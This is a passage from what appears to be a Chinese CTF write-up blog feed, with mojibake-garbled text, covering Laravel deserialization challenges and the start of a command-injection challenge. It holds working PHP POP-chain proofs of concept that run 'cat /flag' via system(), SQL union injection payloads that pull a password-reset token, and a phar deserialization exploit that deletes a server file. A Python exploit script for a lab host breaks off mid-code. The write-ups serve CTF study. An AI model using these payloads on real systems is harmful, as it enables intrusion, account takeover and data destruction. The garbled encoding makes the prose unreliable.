class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'xxx'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$obj = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç¬¬äºŒç§popé“¾ï¼š</li></ul><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143959880.png" alt></p><p>è¿›å…¥ProxyAdapter.phpä¸­ï¼Œè·Ÿè¿›doSaveæ–¹æ³•</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319144241780.png" alt></p><p>popé“¾å›¾å¦‚ä¸‹</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1796442865.png" alt></p><p>pocå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">class CacheItem </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    protected $innerItem &#x3D; &#39;cat &#x2F;flag&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line"></span><br><span class="line">class ProxyAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private $setInnerItem &#x3D; &#39;system&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">    public $deferred &#x3D; [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;pool &#x3D; new ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred &#x3D; array(&#39;a&#39; &#x3D;&gt; new \Symfony\Component\Cache\CacheItem);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>tips:</p><p>é€‰ä¸­ä¸€ä¸ªç±»æ–‡ä»¶ï¼Œå³é”®ï¼Œé€‰æ‹©diagrams-&gt;show diagrams,å¯ä»¥æŸ¥çœ‹æŸ¥çœ‹ç±»çš„ç»§æ‰¿å…³ç³» </p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319145109768.png" alt></p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104287956" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104287956</a></p></blockquote><h3 id="0x-02-æŠ¤ç½‘æ¯-2018-easy-laravel"><a href="#0x-02-æŠ¤ç½‘æ¯-2018-easy-laravel" class="headerlink" title="0x 02 [æŠ¤ç½‘æ¯ 2018]easy_laravel"></a>0x 02 [æŠ¤ç½‘æ¯ 2018]easy_laravel</h3><blockquote><p>é¢˜ç›®ç¯å¢ƒè¯´æ˜ï¼šbuuoj ä¸Šçš„å¤ç°ï¼Œå’ŒåŸç‰ˆçš„é¢˜ç›®ä¸æ˜¯å®Œå…¨ä¸€æ ·ã€‚åŸé¢˜ä½¿ç”¨çš„æ˜¯ nginx + mysqlçš„é…ç½® è€Œ buuoj ä¸Šçš„æ˜¯ apache + sqliteé…ç½®ç¯å¢ƒ</p></blockquote><ul><li>å‰ç½®çŸ¥è¯†</li></ul><h4 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h4><p>è¿™æ˜¯åœ¨ PHP5.3 ä»¥ä¸Šçš„ä¸€ä¸ªä¾èµ–ç®¡ç†å·¥å…·ã€‚æ„Ÿè§‰å’Œ docker å¾ˆåƒï¼Œdocker-compose æ ¹æ® <code>docker-compose.yml</code> ä¸­é…ç½®çš„æœåŠ¡å’Œé•œåƒï¼Œç”Ÿæˆè™šæ‹Ÿæœºã€‚PHP ä¸­çš„ composer åˆ™æ˜¯æ ¹æ® <code>composer.json</code> åŠ è½½é…ç½®çš„ php package</p><p>é…ç½®æ›´æ–°æºï¼ŒComposer é•œåƒç«™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><p>å‡çº§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer self-update æˆ–è€… composer update --lock</span><br></pre></td></tr></table></figure><p>è¯Šæ–­å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer diagnose</span><br></pre></td></tr></table></figure><p>æ¸…é™¤ç¼“å­˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer clear</span><br></pre></td></tr></table></figure><p>æ ¹æ® <code>composer.json</code> å®‰è£… php package</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer install</span><br></pre></td></tr></table></figure><h4 id="Laravelä¸­é—´ä»¶-Middleware"><a href="#Laravelä¸­é—´ä»¶-Middleware" class="headerlink" title="Laravelä¸­é—´ä»¶(Middleware)"></a>Laravelä¸­é—´ä»¶(Middleware)</h4><p>åœ¨Laravelä¸­èµ·ç€è¿‡æ»¤è¿›å…¥åº”ç”¨çš„HTTPè¯·æ±‚å¯¹è±¡(Request)å’Œå®Œå–„ç¦»å¼€åº”ç”¨çš„HTTPå“åº”å¯¹è±¡(Reponse)çš„ä½œç”¨, è€Œä¸”å¯ä»¥é€šè¿‡åº”ç”¨å¤šä¸ªä¸­é—´ä»¶æ¥å±‚å±‚è¿‡æ»¤è¯·æ±‚ã€é€æ­¥å®Œå–„ç›¸åº”ã€‚</p><p><img src="https://segmentfault.com/img/bV3mey" alt="å›¾ç‰‡æè¿°"></p><ul><li>è§£é¢˜è¿‡ç¨‹</li></ul><ol><li>æ‰“å¼€åç½‘é¡µæºç æç¤ºgithubä¸Šæœ‰æºç ã€‚ä½†æ˜¯åšé¢˜çš„æ—¶å€™æºç å·²ç»æ²¡äº†ï¼Œæ‰€ä»¥ä»é¢˜ç›®ç¯å¢ƒä¸­æ‹–ä¸‹æ¥å®¡è®¡</li></ol><p>é¦–å…ˆæŸ¥çœ‹æ•°æ®åº“æ–‡ä»¶ï¼Œdatabase/factories/ModelFactory.phpä¸­è®°å½•Userçš„ä¿¡æ¯ï¼Œå‘ç°ç”¨æˆ·åå’Œemailå·²çŸ¥ï¼Œå¯†ç æ˜¯éšæœºç”Ÿæˆä¸”è¿›è¿‡ç»è¿‡ <code>bcrypt</code> å¤„ç†çš„ï¼Œæ³¨å…¥å‡ºæ¥æ˜¯æ²¡åŠæ³•è§£å¼€</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319223604248.png" alt></p><p>è·¯ç”±ä¿¡æ¯åœ¨routes/web.phpä¸­ï¼Œå¯¹åº”çš„Controlleråœ¨app/Http/Controllers/ä¸‹å¯¹åº”çš„PHPæ–‡ä»¶ã€‚Uploadå’ŒFlagåªæœ‰adminç”¨æˆ·å¯ä»¥è®¿é—®ã€‚</p><ol start="2"><li>ä¸éš¾å‘ç°åœ¨ <code>App\Http\Controllers</code> ä¸­çš„ <code>NoteController</code> å­˜åœ¨æ³¨å…¥</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224015666.png" alt></p><p>ç”±äºæ•°æ®åº“æ˜¯sqliteï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨#ï¼Œæ ¹æ®æ•°æ®è¡¨å¯ä»¥æœ‰äº”ä¸ªå­—æ®µï¼Œè¿›è¡Œè”åˆæ³¨å…¥ï¼ŒæŸ¥çœ‹å›æ˜¾ä½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3,4,5--</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224543246.png" alt></p><p>å¾—åˆ°å›æ˜¾ä½æ˜¯ç¬¬äºŒä½ï¼Œç”±äºadminç”¨æˆ·çš„å¯†ç è¿›è¿‡<code>bcrypt</code> å¤„ç†çš„ï¼Œæ³¨å…¥å‡ºæ¥æ˜¯æ²¡åŠæ³•è§£å¼€,æ ¹æ®å­˜åœ¨çš„password_resetså°è¯•æ³¨å…¥å‡ºadminç”¨æˆ·é‡ç½®çš„token</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224716167.png" alt></p><p>å…ˆå‘é€é‡ç½®é‚®ä»¶ï¼Œç”Ÿæˆtokenæ’å…¥æ•°æ®åº“ä¸­</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225039464.png" alt></p><p>ç„¶åè¿›è¡ŒSQLæ³¨å…¥æŸ¥è¯¢ã€‚payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;union select 1,token,3,4,5 from password_resets where email&#x3D;&#39;admin@qvq.im&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225523909.png" alt></p><p>ç„¶åè®¿é—® <a href="http://url/password/reset/token" target="_blank" rel="noopener">http://url/password/reset/token</a> å³å¯é‡ç½®å¯†ç </p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225818508.png" alt></p><p>ç„¶åæ”¹å¯†ç å³å¯ç™»å…¥ç®¡ç†å‘˜ï¼Œä½†æ˜¯flagä¸‹é¢æ˜¯<code>no flag</code></p><p>é¢˜ç›®æç¤ºæ˜¯bladeè¿‡æœŸçš„é—®é¢˜ï¼Œæ ¹æ®èµ„æ–™å‘ç°Blade æ˜¯ laravel æä¾›çš„ä¸€ä¸ªç®€å•å¼ºå¤§çš„æ¨¡æ¿å¼•æ“ã€‚å®ƒä¸åƒå…¶ä»–æµè¡Œçš„ PHP æ¨¡æ¿å¼•æ“é‚£æ ·é™åˆ¶ä½ åœ¨è§†å›¾ä¸­ä½¿ç”¨åŸç”Ÿçš„ PHP ä»£ç ï¼Œäº‹å®ä¸Šå®ƒå°±æ˜¯æŠŠ Blade è§†å›¾ç¼–è¯‘æˆåŸç”Ÿçš„ PHP ä»£ç å¹¶ç¼“å­˜èµ·æ¥ã€‚ç¼“å­˜ä¼šåœ¨ Blade è§†å›¾æ”¹å˜æ—¶è€Œæ”¹å˜ï¼Œè¿™æ„å‘³ç€ Blade å¹¶æ²¡æœ‰ç»™ä½ çš„åº”ç”¨æ·»åŠ ç¼–è¯‘çš„è´Ÿæ‹…ã€‚</p><p>é‚£ä¸‹ä¸€ç›®æ ‡å°±æ˜¯æŠŠç¼“å­˜çš„æ–‡ä»¶åˆ é™¤æ‰ã€‚</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319230346302.png" alt></p><p>blade ç¼“å­˜ä½ç½®æ˜¯ <code>storage/framework/views</code> apache çš„é»˜è®¤ç›®å½•æ˜¯ <code>/var/www/html/</code> åœ¨ä¸€èµ·å°±æ˜¯ <code>/var/www/html/storage/framework/views</code> ç»“åˆä¸Šé¢çš„ sha1 å°±æ˜¯ <code>/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php</code></p><ol start="3"><li>æ¥æ¥ä¸‹æ˜¯å¯»æ‰¾popé“¾åˆ é™¤æ–‡ä»¶ï¼Œè¿™é‡Œå‘ç°<code>composer.json</code>ä¸­æä¾›äº†å¤§é‡ç»„ä»¶ï¼Œæˆ‘ä»¬å®‰è£…ä¸€ä¸‹ï¼Œç„¶åå…¨å±€æœç´¢<code>unlink()</code>åœ¨<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php</code>ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319230901785.png" alt></p><p>ç„¶ååœ¨ UploadController ä¸­çš„ check() å‡½æ•°ä¸­å‘ç°è°ƒç”¨äº† file_exists() å‡½æ•°ï¼Œå¹¶ä¸”ä¸¤ä¸ªå‚æ•°éƒ½å¯æ§,å¯ä»¥è§¦å‘pharååºåˆ—åŒ–</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231028491.png" alt></p><p>ä¸Šä¼ åçš„æ–‡ä»¶è·¯å¾„ä¹Ÿå¯ä»¥å¾—çŸ¥</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231117319.png" alt></p><p>æ„é€ exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $sequence = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $filters = [];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $writeBuffer = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $mirrors = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> $_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_path;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> $_mode;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_reader;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_writer;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> $_quotes = <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> $_seekable = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path, $writable = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = $writable ? <span class="string">'w+b'</span> : <span class="string">'rb'</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'get_magic_quotes_runtime'</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $filePath = <span class="string">"/var/www/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php"</span>;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($filePath, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„æ–‡ä»¶ä¸Šä¼ åï¼Œç‚¹å‡»checkæŠ“åŒ…,æ·»åŠ pathå‚æ•°<code>phar:///var/www/html/storage/app/public/1.gif</code></p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231622734.png" alt></p><p>æäº¤ä»¥åæ¨¡æ¿æ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œæˆ‘ä»¬è®¿é—®/flagå°±ä¼šå‡ºç°åˆ·æ–°ä»¥åçš„é¡µé¢ï¼Œå³flagäº†</p><p>å¦å¤–æˆ‘åœ¨å…ˆçŸ¥ä¸Šçœ‹åˆ°æœ‰ä¸€ä¸ªpopé“¾å¯ä»¥rceï¼Œ<a href="https://xz.aliyun.com/t/2901ï¼Œæœ‰æ—¶é—´è¡¥ä¸€ä¸‹ï¼Œå…ˆå ä¸ªå‘" target="_blank" rel="noopener">https://xz.aliyun.com/t/2901ï¼Œæœ‰æ—¶é—´è¡¥ä¸€ä¸‹ï¼Œå…ˆå ä¸ªå‘</a></p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://www.cnblogs.com/peri0d/p/12512343.html" target="_blank" rel="noopener">https://www.cnblogs.com/peri0d/p/12512343.html</a></p><p><a href="https://tiaonmmn.github.io/2019/09/04/BUUOJåˆ·é¢˜-Web-easy-laravel/#more" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-laravel/#more</a></p><p><a href="https://www.anquanke.com/post/id/161849#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/161849#h3-4</a></p></blockquote><h3 id="0x-03-CISCN2019-æ€»å†³èµ›-Day2-Web2-Laravel-File-Manager"><a href="#0x-03-CISCN2019-æ€»å†³èµ›-Day2-Web2-Laravel-File-Manager" class="headerlink" title="0x 03 [CISCN2019 æ€»å†³èµ› Day2 Web2]Laravel File Manager"></a>0x 03 [CISCN2019 æ€»å†³èµ› Day2 Web2]Laravel File Manager</h3><p>å‚è€ƒï¼š<a href="https://blog.szfszf.top/article/39/#getshell-or-blade" target="_blank" rel="noopener">https://blog.szfszf.top/article/39/#getshell-or-blade</a> ä»¥åæ…¢æ…¢å¡«å‘QAQ</p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
            <tag> Laravelååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”±ä¸€é“å…¥ç¾¤é¢˜å­¦ä¹ å†…ç½‘æ¸—é€åŸºç¡€</title>
      <link href="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h3 id="é¢˜ç›®åç§°ï¼šctf473831530-2018-web-virink-web"><a href="#é¢˜ç›®åç§°ï¼šctf473831530-2018-web-virink-web" class="headerlink" title="é¢˜ç›®åç§°ï¼šctf473831530_2018_web_virink_web"></a>é¢˜ç›®åç§°ï¼šctf473831530_2018_web_virink_web</h3><ol><li>é¡µé¢æ‰“å¼€æ˜¯æºä»£ç </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&#39;orange&#39; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 20) &#123;</span><br><span class="line">        exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br &#x2F;&gt; IP : &#123;\$_SERVER[&#39;REMOTE_ADDR&#39;]&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>åˆ©ç”¨<code>1=&gt;filename</code>çš„ç‰¹æ€§åˆ›å»ºç‰¹æ®Šçš„æ–‡ä»¶ï¼Œç„¶å<code>ls -tr</code>åˆ—æ–‡ä»¶æ‹¼å‡ºå®Œæ•´çš„shellã€‚expå¦‚ä¸‹ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">base_url &#x3D; &#39;http:&#x2F;&#x2F;d9cdeeab-00ae-45c0-bc56-45fb800d996a.node3.buuoj.cn&#39;</span><br><span class="line"></span><br><span class="line">def exec_cmd2(c):</span><br><span class="line">    # exec cmd</span><br><span class="line">    my_params &#x3D; &#123;</span><br><span class="line">        &#39;cmd&#39;: c</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.get(base_url, params&#x3D;my_params)</span><br><span class="line">    print(&#39;exec cmd2&#39;, c, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def 